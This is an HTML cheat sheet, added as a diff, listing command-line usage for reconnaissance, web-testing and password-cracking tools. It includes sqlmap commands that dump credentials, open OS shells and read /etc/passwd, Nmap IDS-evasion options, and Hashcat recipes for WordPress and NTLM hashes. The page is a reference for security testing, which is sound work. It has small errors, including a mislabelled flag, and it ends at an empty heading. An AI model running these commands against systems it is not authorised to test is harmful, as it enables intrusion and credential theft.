@@ -1,0 +1,867 @@
+<!-- Reconnaissance Tools -->
+<h2>Reconnaissance</h2>
+
+<!-- Nmap Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('nmap')">Nmap - Network mapper for port scanning and service enumeration.</div>
+    <div class="tool-details" id="nmap">
+        
+        <h3>Target Specification</h3>
+        <ul>
+            <li><strong>Scan a single IP:</strong> <code>nmap 192.168.1.1</code></li>
+            <li><strong>Scan specific IPs:</strong> <code>nmap 192.168.1.1 192.168.2.1</code></li>
+            <li><strong>Scan a range:</strong> <code>nmap 192.168.1.1-254</code></li>
+            <li><strong>Scan a domain:</strong> <code>nmap scanme.nmap.org</code></li>
+            <li><strong>Scan using CIDR:</strong> <code>nmap 192.168.1.0/24</code></li>
+            <li><strong>Scan targets from a file:</strong> <code>nmap -iL targets.txt</code></li>
+            <li><strong>Scan random hosts:</strong> <code>nmap -iR 100</code></li>
+            <li><strong>Exclude listed hosts:</strong> <code>nmap -exclude 192.168.1.1</code></li>
+        </ul>
+
+        <h3>Nmap Scan Techniques</h3>
+        <ul>
+            <li><strong>TCP SYN scan (Default):</strong> <code>nmap 192.168.1.1 -sS</code></li>
+            <li><strong>TCP connect scan:</strong> <code>nmap 192.168.1.1 -sT</code></li>
+            <li><strong>UDP port scan:</strong> <code>nmap 192.168.1.1 -sU</code></li>
+            <li><strong>TCP ACK port scan:</strong> <code>nmap 192.168.1.1 -sA</code></li>
+            <li><strong>TCP Window port scan:</strong> <code>nmap 192.168.1.1 -sW</code></li>
+            <li><strong>TCP Maimon port scan:</strong> <code>nmap 192.168.1.1 -sM</code></li>
+        </ul>
+
+        <h3>Host Discovery</h3>
+        <ul>
+            <li><strong>No Scan (List targets only):</strong> <code>nmap 192.168.1.1-3 -sL</code></li>
+            <li><strong>Disable port scanning (Host discovery only):</strong> <code>nmap 192.168.1.1/24 -sn</code></li>
+            <li><strong>Disable host discovery (Port scan only):</strong> <code>nmap 192.168.1.1-5 -Pn</code></li>
+            <li><strong>TCP SYN discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PS22-25,80</code></li>
+            <li><strong>TCP ACK discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PA22-25,80</code></li>
+            <li><strong>UDP discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PU53</code></li>
+            <li><strong>ARP discovery on local network:</strong> <code>nmap 192.168.1.1-1/24 -PR</code></li>
+            <li><strong>Never do DNS resolution:</strong> <code>nmap 192.168.1.1 -n</code></li>
+        </ul>
+
+        <h3>Port Specification</h3>
+        <ul>
+            <li><strong>Port scan for port x:</strong> <code>nmap 192.168.1.1 -p 21</code></li>
+            <li><strong>Port range:</strong> <code>nmap 192.168.1.1 -p 21-100</code></li>
+            <li><strong>Scan multiple TCP/UDP ports:</strong> <code>nmap 192.168.1.1 -p U:53,T:21-25,80</code></li>
+            <li><strong>Scan all ports:</strong> <code>nmap 192.168.1.1 -p-</code></li>
+            <li><strong>Port scan from service name:</strong> <code>nmap 192.168.1.1 -p http,https</code></li>
+            <li><strong>Fast port scan (100 ports):</strong> <code>nmap 192.168.1.1 -F</code></li>
+            <li><strong>Scan top x ports:</strong> <code>nmap 192.168.1.1 -top-ports 2000</code></li>
+            <li><strong>Leaving off initial port in range:</strong> <code>nmap 192.168.1.1 -p-65535</code></li>
+            <li><strong>Leaving off end port in range:</strong> <code>nmap 192.168.1.1 -p0-</code></li>
+        </ul>
+
+        <h3>Service and Version Detection</h3>
+        <ul>
+            <li><strong>Service version detection:</strong> <code>nmap 192.168.1.1 -sV</code></li>
+            <li><strong>Set version intensity (0-9):</strong> <code>nmap 192.168.1.1 -sV -version-intensity 8</code></li>
+            <li><strong>Light mode (Faster):</strong> <code>nmap 192.168.1.1 -sV -version-light</code></li>
+            <li><strong>Intensity level 9 (Slower):</strong> <code>nmap 192.168.1.1 -sV -version-all</code></li>
+            <li><strong>Enable OS detection, version detection, script scanning, and traceroute:</strong> <code>nmap 192.168.1.1 -A</code></li>
+        </ul>
+
+        <h3>OS Detection</h3>
+        <ul>
+            <li><strong>Remote OS detection:</strong> <code>nmap 192.168.1.1 -O</code></li>
+            <li><strong>OS detection with limited open/closed ports:</strong> <code>nmap 192.168.1.1 -O -osscan-limit</code></li>
+            <li><strong>Aggressive OS guessing:</strong> <code>nmap 192.168.1.1 -O -osscan-guess</code></li>
+            <li><strong>Set maximum OS detection tries:</strong> <code>nmap 192.168.1.1 -O -max-os-tries 1</code></li>
+            <li><strong>Enable OS detection, version detection, script scanning, and traceroute:</strong> <code>nmap 192.168.1.1 -A</code></li>
+        </ul>
+
+        <h3>Timing and Performance</h3>
+        <ul>
+            <li><strong>Paranoid (IDS evasion):</strong> <code>nmap 192.168.1.1 -T0</code></li>
+            <li><strong>Sneaky (IDS evasion):</strong> <code>nmap 192.168.1.1 -T1</code></li>
+            <li><strong>Polite (less bandwidth/resource usage):</strong> <code>nmap 192.168.1.1 -T2</code></li>
+            <li><strong>Normal (default speed):</strong> <code>nmap 192.168.1.1 -T3</code></li>
+            <li><strong>Aggressive (fast/reliable network):</strong> <code>nmap 192.168.1.1 -T4</code></li>
+            <li><strong>Insane (extraordinarily fast network):</strong> <code>nmap 192.168.1.1 -T5</code></li>
+        </ul>
+
+        <h3>Timing and Performance Switches</h3>
+        <ul>
+            <li><strong>Timeout after x:</strong> <code>nmap 192.168.1.1 -host-timeout 1s</code></li>
+            <li><strong>Specify RTT time:</strong> <code>nmap 192.168.1.1 -min-rtt-timeout 1s</code></li>
+            <li><strong>Parallel host scan group sizes:</strong> <code>nmap 192.168.1.1 -scan-delay 1s</code></li>
+        
+        <h3>NSE Scripts</h3>
+        <ul>
+            <li><strong>List all available scripts:</strong> <code>nmap --script-help=</code></li>
+            <li><strong>Run a specific script:</strong> <code>nmap --script script_name</code></li>
+            <li><strong>Run multiple scripts:</strong> <code>nmap --script script1,script2</code></li>
+            <li><strong>Use a script category:</strong> <code>nmap --script category</code></li>
+        </ul>
+
+        <h3>Firewall/IDS Evasion Techniques</h3>
+        <ul>
+            <li><strong>Fragment packets:</strong> <code>nmap -f</code></li>
+            <li><strong>Use a decoy:</strong> <code>nmap -D RND:10</code></li>
+            <li><strong>Use a spoofed IP address:</strong> <code>nmap -S 192.168.1.100</code></li>
+            <li><strong>Randomize target order:</strong> <code>nmap --randomize-hosts</code></li>
+            <li><strong>Change source port:</strong> <code>nmap --source-port 53</code></li>
+            <li><strong>Idle scan (stealth scan):</strong> <code>nmap -sI 192.168.1.100</code></li>
+        </ul>
+    </div>
+</div>
+
+<!-- Netdiscover Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('netdiscover')">Netdiscover - ARP scanner for discovering hosts in a network.</div>
+    <div class="tool-details" id="netdiscover">
+        
+        <h3>Target Specification</h3>
+        <ul>
+            <li><strong>Scan Local Network:</strong> <code>netdiscover -r 192.168.1.0/24</code></li>
+            <li><strong>Scan Specific Interface:</strong> <code>netdiscover -i eth0</code></li>
+            <li><strong>Passive Mode:</strong> <code>netdiscover -p</code></li>
+            <li><strong>Scan Specific IP Range:</strong> <code>netdiscover -r 192.168.1.1-192.168.1.100</code></li>
+            <li><strong>Set Time Interval Between ARP Requests:</strong> <code>netdiscover -s 50</code></li>
+        </ul>
+        
+        <h3>Advanced Options</h3>
+        <ul>
+            <li><strong>Scan for Specific MAC Addresses:</strong> <code>netdiscover -m 00:11:22:33:44:55</code></li>
+            <li><strong>Active Scanning Mode:</strong> <code>netdiscover -A</code></li>
+            <li><strong>Output Results to a File:</strong> <code>netdiscover -r 192.168.1.0/24 -f output.txt</code></li>
+            <li><strong>Set Number of Retries:</strong> <code>netdiscover -n 2</code></li>
+        </ul>
+        
+    </div>
+</div>
+
+<!-- Sublist3r Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('sublist3r')">Sublist3r - Subdomain enumeration tool.</div>
+    <div class="tool-details" id="sublist3r">
+        
+        <h3>Basic Usage</h3>
+        <ul>
+            <li><strong>Enumerate Subdomains:</strong> <code>sublist3r -d example.com</code></li>
+            <li><strong>Save Results to a File:</strong> <code>sublist3r -d example.com -o output.txt</code></li>
+            <li><strong>Specify Number of Threads:</strong> <code>sublist3r -d example.com -t 10</code></li>
+        </ul>
+        
+        <h3>Search Engines and APIs</h3>
+        <ul>
+            <li><strong>Use Specific Search Engines:</strong> <code>sublist3r -d example.com -e google,yahoo,bing</code></li>
+            <li><strong>Use Virustotal API:</strong> <code>sublist3r -d example.com --virustotal</code></li>
+            <li><strong>Use Passive DNS Data:</strong> <code>sublist3r -d example.com --passive</code></li>
+        </ul>
+        
+        <h3>Advanced Options</h3>
+        <ul>
+            <li><strong>Verbose Output:</strong> <code>sublist3r -v -d example.com</code></li>
+            <li><strong>Enable Debug Mode:</strong> <code>sublist3r -d example.com --debug</code></li>
+            <li><strong>Specify Timeout for HTTP Requests:</strong> <code>sublist3r -d example.com -T 20</code></li>
+        </ul>
+        
+    </div>
+</div>
+
+<!-- theHarvester Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('theHarvester')">theHarvester - Email, subdomain, and people names enumeration tool.</div>
+    <div class="tool-details" id="theHarvester">
+        
+        <h3>Basic Usage</h3>
+        <ul>
+            <li><strong>Enumerate Emails and Subdomains:</strong> <code>theHarvester -d example.com -b google</code></li>
+            <li><strong>Specify Output File:</strong> <code>theHarvester -d example.com -b google -f output.html</code></li>
+            <li><strong>Use All Search Engines:</strong> <code>theHarvester -d example.com -b all</code></li>
+        </ul>
+        
+        <h3>Search Engine Options</h3>
+        <ul>
+            <li><strong>Use Specific Search Engine:</strong> <code>theHarvester -d example.com -b bing</code></li>
+            <li><strong>Use Shodan API:</strong> <code>theHarvester -d example.com -b shodan</code></li>
+            <li><strong>Limit Search Results:</strong> <code>theHarvester -d example.com -b google -l 500</code></li>
+        </ul>
+        
+        <h3>Advanced Options</h3>
+        <ul>
+            <li><strong>Specify DNS Server:</strong> <code>theHarvester -d example.com -b google -e 8.8.8.8</code></li>
+            <li><strong>Enable Verbose Mode:</strong> <code>theHarvester -d example.com -b google -v</code></li>
+            <li><strong>Test Results for Validity:</strong> <code>theHarvester -d example.com -b google -t</code></li>
+        </ul>
+        
+    </div>
+</div>
+
+<!-- Web Application Testing Tools -->
+<h2>Web Application Testing</h2>
+
+<!-- Burp Suite Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('burp-suite')">Burp Suite - Web vulnerability scanner and proxy.</div>
+    <div class="tool-details" id="burp-suite">
+        <div class="tool-command">Start Burp Suite: <code>burpsuite</code></div>
+        <div class="tool-command">Use Proxy: Configure browser to use Burp's proxy.</div>
+    </div>
+</div>
+
+<!-- OWASP ZAP Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('owasp-zap')">OWASP ZAP (Zed Attack Proxy) - Web vulnerability scanner and proxy.</div>
+    <div class="tool-details" id="owasp-zap">
+        <div class="tool-command">Start ZAP: <code>zap</code></div>
+        <div class="tool-command">Use Proxy: Configure browser to use ZAP's proxy.</div>
+    </div>
+</div>
+
+<!-- SQLMAP Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('sqlmap')">SQLMAP - Automatic SQL injection and database takeover tool.</div>
+    <div class="tool-details" id="sqlmap">
+        <div class="basic-args">
+            <h3>Basic Arguments for SQLmap</h3>
+            <ul>
+                <li><strong>Generic:</strong></li>
+                <ul>
+                    <li><code>-u "&lt;URL&gt;"</code></li>
+                    <li><code>-p "&lt;PARAM TO TEST&gt;"</code></li>
+                    <li><code>--user-agent=SQLMAP</code></li>
+                    <li><code>--random-agent</code></li>
+                    <li><code>--threads=10</code></li>
+                    <li><code>--risk=3</code> (MAX)</li>
+                    <li><code>--level=5</code> (MAX)</li>
+                    <li><code>--dbms="&lt;KNOWN DB TECH&gt;"</code></li>
+                    <li><code>--os="&lt;OS&gt;"</code></li>
+                    <li><code>--technique="UB"</code> (Use only techniques UNION and BLIND in that order)</li>
+                    <li><code>--batch</code> (Non-interactive mode)</li>
+                    <li><code>--auth-type="&lt;AUTH&gt;"</code> (HTTP authentication type: Basic, Digest, NTLM or PKI)</li>
+                    <li><code>--auth-cred="&lt;AUTH&gt;"</code> (HTTP authentication credentials: name:password)</li>
+                    <li><code>--proxy=http://127.0.0.1:8080</code></li>
+                    <li><code>--union-char "GsFRts2"</code> (Helps SQLmap identify union SQLi techniques with a weird union char)</li>
+                </ul>
+            </ul>
+        </div>
+
+        <div class="retrieve-info">
+            <h3>Retrieve Information</h3>
+            <ul>
+                <li><strong>Internal:</strong></li>
+                <ul>
+                    <li><code>--current-user</code> (Get current user)</li>
+                    <li><code>--is-dba</code> (Check if current user is Admin)</li>
+                    <li><code>--hostname</code> (Get hostname)</li>
+                    <li><code>--users</code> (Get usernames of DB)</li>
+                    <li><code>--passwords</code> (Get passwords of users in DB)</li>
+                    <li><code>--privileges</code> (Get privileges)</li>
+                </ul>
+
+                <li><strong>DB Data:</strong></li>
+                <ul>
+                    <li><code>--all</code> (Retrieve everything)</li>
+                    <li><code>--dump</code> (Dump DBMS database table entries)</li>
+                    <li><code>--dbs</code> (Names of the available databases)</li>
+                    <li><code>--tables</code> (Tables of a database -D &lt;DB NAME&gt;)</li>
+                    <li><code>--columns</code> (Columns of a table -D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt;)</li>
+                    <li><code>-D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; -C &lt;COLUMN NAME&gt;</code> (Dump column)</li>
+                </ul>
+            </ul>
+        </div>
+
+        <div class="injection-place">
+            <h3>Injection Place</h3>
+            <ul>
+                <li><strong>From Burp/ZAP capture:</strong></li>
+                <p>Capture the request and create a <code>req.txt</code> file:</p>
+                <code>sqlmap -r req.txt --current-user</code>
+
+                <li><strong>GET Request Injection:</strong></li>
+                <code>sqlmap -u "http://example.com/?id=1" -p id</code><br>
+                <code>sqlmap -u "http://example.com/?id=*" -p id</code>
+
+                <li><strong>POST Request Injection:</strong></li>
+                <code>sqlmap -u "http://example.com" --data "username=*&password=*"</code>
+
+                <li><strong>Injections in Headers and other HTTP Methods:</strong></li>
+                <code>sqlmap -u "http://example.com" --cookie "mycookies=*"</code><br>
+                <code>sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"</code><br>
+                <code>sqlmap -u "http://example.com" --headers="referer:*"</code><br>
+                <code>sqlmap --method=PUT -u "http://example.com" --headers="referer:*"</code>
+
+                <li><strong>Indicate string when injection is successful:</strong></li>
+                <code>--string="string_showed_when_TRUE"</code>
+            </ul>
+        </div>
+
+        <div class="eval">
+            <h3>Eval</h3>
+            <p>Sqlmap allows the use of <code>-e</code> or <code>--eval</code> to process each payload before sending it with some python oneliner. 
+               This makes processing custom ways very easy and fast before sending the payload. Example:</p>
+            <code>sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump</code>
+        </div>
+
+        <div class="shell">
+            <h3>Shell</h3>
+            <ul>
+                <li><code>python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami</code></li>
+                <li><code>python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell</code></li>
+                <li><code>python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn</code></li>
+            </ul>
+        </div>
+
+        <div class="file-read">
+            <h3>Read File</h3>
+            <code>--file-read=/etc/passwd</code>
+        </div>
+
+        <div class="crawl">
+            <h3>Crawl a Website and Auto-Exploit</h3>
+            <p>Crawl a site and perform auto SQLi testing:</p>
+            <code>sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3</code>
+            <ul>
+                <li><code>--batch</code> = non-interactive mode</li>
+                <li><code>--crawl</code> = how deep you want to crawl a site</li>
+                <li><code>--forms</code> = Parse and test forms</li>
+            </ul>
+        </div>
+
+        <div class="second-order-injection">
+            <h3>Second Order Injection</h3>
+            <code>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3</code><br>
+            <code>sqlmap -r 1.txt -dbms MySQL -second-order "http://&lt;IP/domain&gt;/joomla/administrator/index.php" -D "joomla" -dbs</code>
+        </div>
+
+        <div class="custom-injection">
+            <h3>Customizing Injection</h3>
+            <ul>
+                <li><code>--suffix="-- "</code> (Set a suffix)</li>
+                <li><code>--prefix="') "</code> (Set a prefix)</li>
+                <li><strong>Help finding boolean injection:</strong></li>
+                <code>sqlmap -r r.txt -p id --not-string ridiculous --batch</code>
+            </ul>
+        </div>
+
+        <div class="tamper">
+            <h3>Tamper Scripts</h3>
+            <p>SQLmap supports various tamper scripts for bypassing protections:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tamper</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>apostrophemask.py</td>
+                        <td>Replaces apostrophe character with its UTF-8 full width counterpart</td>
+                    </tr>
+                    <tr>
+                        <td>appendnullbyte.py</td>
+                        <td>Appends encoded NULL byte character at the end of payload</td>
+                    </tr>
+                    <tr>
+                        <td>base64encode.py</td>
+                        <td>Encodes all characters in a base64 format</td>
+                    </tr>
+                    <tr>
+                        <td>between.py</td>
+                        <td>Replaces greater than operator with BETWEEN clause</td>
+                    </tr>
+                    <tr>
+                        <td>bluecoat.py</td>
+                        <td>Replaces space character with a valid random blank character</td>
+                    </tr>
+                    <!-- Add more rows as necessary -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- GoBuster Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('gobuster')">GoBuster - Directory, DNS, and virtual host brute forcing tool.</div>
+    <div class="tool-details" id="gobuster">
+        
+        <h3>Directory Brute Forcing</h3>
+        <ul>
+            <li><strong>Basic Directory Brute Force:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt</code></li>
+            <li><strong>Specify Extensions:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt -x php,html</code></li>
+            <li><strong>Ignore Length:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt -l</code></li>
+        </ul>
+        
+        <h3>DNS Brute Forcing</h3>
+        <ul>
+            <li><strong>Basic DNS Brute Force:</strong> <code>gobuster dns -d example.com -w wordlist.txt</code></li>
+            <li><strong>Specify DNS Server:</strong> <code>gobuster dns -d example.com -w wordlist.txt -s 8.8.8.8</code></li>
+            <li><strong>Show Wildcards:</strong> <code>gobuster dns -d example.com -w wordlist.txt -w</code></li>
+        </ul>
+        
+        <h3>Virtual Host Brute Forcing</h3>
+        <ul>
+            <li><strong>Virtual Host Brute Force:</strong> <code>gobuster vhost -u http://example.com -w wordlist.txt</code></li>
+            <li><strong>Specify HTTP Method:</strong> <code>gobuster vhost -u http://example.com -w wordlist.txt -m POST</code></li>
+        </ul>
+        
+    </div>
+</div>
+
+<!-- ffuf Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ffuf')">ffuf - Fuzzing tool for web directories and files.</div>
+    <div class="tool-details" id="ffuf">
+        <h3>Typical commands & Usage</h3>
+        <div class="tool-command">
+            Directory discovery: 
+            <code>ffuf -w /path/to/wordlist -u https://target/FUZZ</code>
+        </div>
+        <div class="tool-command">
+            Adding classical headers (for some WAF bypass): 
+            <code>ffuf -c -w "/opt/host/main.txt:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1" -fs 5682,0 -u https://target/FUZZ</code>
+        </div>
+        <div class="tool-command">
+            Match all responses but filter out those with content-size 42: 
+            <code>ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v</code>
+        </div>
+        <div class="tool-command">
+            Fuzz Host-header, match HTTP 200 responses: 
+            <code>ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200</code>
+        </div>
+        <div class="tool-command">
+            Virtual host discovery (without DNS records): 
+            <code>ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242</code>
+        </div>
+        <div class="tool-command">
+            Playing with threads and wait: 
+            <code>ffuf -u https://target/FUZZ -w /path/to/wordlist.txt -c -p 0.1 -t 10</code>
+        </div>
+        <div class="tool-command">
+            GET param fuzzing, filtering for invalid response size (or other filters): 
+            <code>ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242</code>
+        </div>
+        <div class="tool-command">
+            GET parameter fuzzing if the param is known (fuzzing values) and filtering 401 responses: 
+            <code>ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401</code>
+        </div>
+        <div class="tool-command">
+            POST parameter fuzzing: 
+            <code>ffuf -w /path/to/postdata.txt -X POST -d "username=admin&password=FUZZ" -u https://target/login.php -fc 401</code>
+        </div>
+        <div class="tool-command">
+            Fuzz POST JSON data, matching all responses not containing "error": 
+            <code>ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"</code>
+        </div>
+    </div>
+</div>
+
+<!-- Metasploit Framework Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('metasploit')">Metasploit Framework - Penetration testing and exploitation framework.</div>
+    <div class="tool-details" id="metasploit">
+        <div class="tool-command">Start Console: <code>msfconsole</code></div>
+        <div class="tool-command">Basic Exploit: <code>use [exploit_name] -e [payload]</code></div>
+    </div>
+</div>
+
+<!-- PowerSploit Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('powersploit')">PowerSploit - PowerShell post-exploitation framework.</div>
+    <div class="tool-details" id="powersploit">
+        <div class="tool-command">Start PowerShell: <code>powershell</code></div>
+        <div class="tool-command">Run Script: <code>Invoke-Shellcode</code></div>
+    </div>
+</div>
+
+<!-- Veil-Framework Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('veil')">Veil-Framework - Payload generation and obfuscation framework.</div>
+    <div class="tool-details" id="veil">
+        <div class="tool-command">Start Veil: <code>veil</code></div>
+        <div class="tool-command">Generate Payload: <code>generate</code></div>
+    </div>
+</div>
+
+<!-- Bettercap Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('bettercap')">Bettercap - Network attack and monitoring framework.</div>
+    <div class="tool-details" id="bettercap">
+        <div class="tool-command">Start Bettercap: <code>bettercap</code></div>
+        <div class="tool-command">Network Scan: <code>net.probe</code></div>
+    </div>
+</div>
+
+<!-- Responder Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('responder')">Responder - LLMNR, NBT-NS, and MDNS poisoner.</div>
+    <div class="tool-details" id="responder">
+        <div class="tool-command">Start Responder: <code>responder -I [interface]</code></div>
+        <div class="tool-command">Specify Protocols: <code>responder -I [interface] -r</code></div>
+    </div>
+</div>
+
+<!-- CrackMapExec Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('crackmapexec')">CrackMapExec (CME) - Post-exploitation tool for Windows systems.</div>
+    <div class="tool-details" id="crackmapexec">
+        <div class="tool-command">Basic Scan: <code>crackmapexec smb [target]</code></div>
+        <div class="tool-command">Enumerate Users: <code>crackmapexec smb [target] --users</code></div>
+    </div>
+</div>
+
+<!-- Password Cracking Tools -->
+<h2>Password Cracking</h2>
+
+<!-- John the Ripper Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('john')">John the Ripper - Password hash cracker.</div>
+    <div class="tool-details" id="john">
+        <h3>Cracking Modes</h3>
+        <div class="tool-command">
+            Dictionary attack: 
+            <code>./john --wordlist=password.lst hashFile</code>
+        </div>
+        <div class="tool-command">
+            Dictionary attack using default or specific rules: 
+            <code>./john --wordlist=password.lst --rules=rulename hashFile</code>
+            <br>
+            <code>./john --wordlist=password.lst --rules mypasswd</code>
+        </div>
+        <div class="tool-command">
+            Incremental mode: 
+            <code>./john --incremental hashFile</code>
+        </div>
+        <div class="tool-command">
+            Loopback attack (passwords are taken from the potfile): 
+            <code>./john --loopback hashFile</code>
+        </div>
+        <div class="tool-command">
+            Mask brute-force attack: 
+            <code>./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8</code>
+        </div>
+        <div class="tool-command">
+            Dictionary attack using masks: 
+            <code>./john --wordlist=password.lst -mask='?l?l?w?l' hashFile</code>
+        </div>
+        
+        <h3>MISC & Tricks</h3>
+        <div class="tool-command">
+            Show hidden options: 
+            <code>./john --list=hidden-options</code>
+        </div>
+        <div class="tool-command">
+            Using session and restoring them: 
+            <code>./john hashes --session=name</code>
+            <br>
+            <code>./john --restore=name</code>
+        </div>
+        <div class="tool-command">
+            Show the potfile: 
+            <code>./john hashes --pot=potFile --show</code>
+        </div>
+        <div class="tool-command">
+            Search if root/uid0 have been cracked: 
+            <code>john --show --users=0 mypasswdFile</code>
+            <br>
+            <code>john --show --users=root mypasswdFile</code>
+        </div>
+        <div class="tool-command">
+            List OpenCL devices and get their id: 
+            <code>./john --list=opencl-devices</code>
+        </div>
+        <div class="tool-command">
+            List format supported by OpenCL: 
+            <code>./john --list=formats --format=opencl</code>
+        </div>
+        <div class="tool-command">
+            Using multiple GPUs: 
+            <code>./john hashes --format:openclformat --wordlist:wordlist --rules:rules --dev=0,1 --fork=2</code>
+        </div>
+        <div class="tool-command">
+            Using multiple CPUs (e.g., 4 cores): 
+            <code>./john hashes --wordlist:wordlist --rules:rules --dev=2 --fork=4</code>
+        </div>
+
+        <h3>Wordlists & Incremental</h3>
+        <div class="tool-command">
+            Sort a wordlist for the wordlist mode: 
+            <code>tr A-Z a-z &lt; SOURCE | sort -u &gt; TARGET</code>
+        </div>
+        <div class="tool-command">
+            Use a potfile to generate a new wordlist: 
+            <code>cut -d ':' -f 2 john.pot | sort -u &gt; pot.dic</code>
+        </div>
+        <div class="tool-command">
+            Generate candidate passwords for slow hashes: 
+            <code>./john --wordlist=password.lst --stdout --rules:Jumbo | ./unique -mem=25 wordlist.uniq</code>
+        </div>
+        <div class="tool-command">
+            Incremental modes: 
+            <code>--incremental:Lower</code> (26 char)
+            <br>
+            <code>--incremental:Alpha</code> (52 char)
+            <br>
+            <code>--incremental:Digits</code> (10 char)
+            <br>
+            <code>--incremental:Alnum</code> (62 char)
+        </div>
+        <div class="tool-command">
+            Create a new charset: 
+            <code>./john --make-charset=charset.chr</code>
+        </div>
+        <div class="tool-command">
+            Use a specific charset: 
+            <code>./john --incremental:charset hashFile</code>
+        </div>
+
+        <h3>Rules</h3>
+        <div class="tool-command">
+            Predefined rules: 
+            <code>--rules:Single</code>, 
+            <code>--rules:Wordlist</code>, 
+            <code>--rules:Extra</code>, 
+            <code>--rules:Jumbo</code>, 
+            <code>--rules:KoreLogic</code>, 
+            <code>--rules:All</code>
+        </div>
+        <div class="tool-command">
+            Create a new rule in John.conf:
+            <br>
+            <pre>[List.Rules:Tryout]
+l
+u
+...
+            </pre>
+        </div>
+        <h4>Sample Rule Descriptions</h4>
+        <ul>
+            <li><code>l</code>: Convert to lowercase</li>
+            <li><code>u</code>: Convert to uppercase</li>
+            <li><code>c</code>: Capitalize</li>
+            <li><code>l r</code>: Lowercase the word and reverse it</li>
+            <li><code>l Az"2015"</code>: Lowercase the word and append "2015"</li>
+            <li><code>d</code>: Duplicate</li>
+            <li><code>l A0"2015"</code>: Lowercase the word and append "2015" at the beginning</li>
+            <li><code>A0"#"Az"#"</code>: Add "#" at the beginning and end of the word</li>
+            <li><code>C</code>: Lowercase the first char and uppercase the rest</li>
+            <li><code>r</code>: Reverse the word</li>
+        </ul>
+    </div>
+</div>
+
+
+<!-- Hashcat Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('hashcat')">Hashcat - Password hash cracker.</div>
+    <div class="tool-details" id="hashcat">
+        <div class="tool-command">Basic Cracking: <code>hashcat -a 0 -m [hash_type] [hashfile] [wordlist]</code></div>
+        <div class="tool-command">Specify Rules: <code>hashcat -a 0 -m [hash_type] [hashfile] [wordlist] -r [rulefile]</code></div>
+        
+        <!-- MAX POWER Section -->
+        <h3>Max Power!</h3>
+        <div class="tool-command">Force maximum performance: <code>hashcat --force -O -w 4 --opencl-device-types 1,2</code></div>
+        <p>These parameters will force Hashcat to use the CUDA GPU interface (–force), optimize for 32 character or less passwords (-O), and set the workload to "Insane" (-w 4). Additionally, <code>--opencl-device-types 1,2</code> forces Hashcat to use both the GPU and CPU for cracking.</p>
+
+        <!-- Linux md5crypt Cracking -->
+        <h3>Cracking Linux md5crypt passwords</h3>
+        <div class="tool-command">Example: <code>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></div>
+
+        <!-- Cracking Wordpress Passwords -->
+        <h3>Cracking Wordpress passwords</h3>
+        <div class="tool-command">Example: <code>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</code></div>
+
+        <!-- HashCat One Rule to Rule Them All -->
+        <h3>HashCat One Rule to Rule Them All</h3>
+        <p>Use the <a href="https://github.com/NotSoSecure/password_cracking_rules" target="_blank">OneRuleToRuleThemAll</a> rule for optimal cracking performance.</p>
+        <div class="tool-command">Example: <code>hashcat64.exe --force -m 300 --status -w 3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt</code></div>
+
+        <!-- Cracking NTLM Hashes -->
+        <h3>Cracking NTLM Hashes</h3>
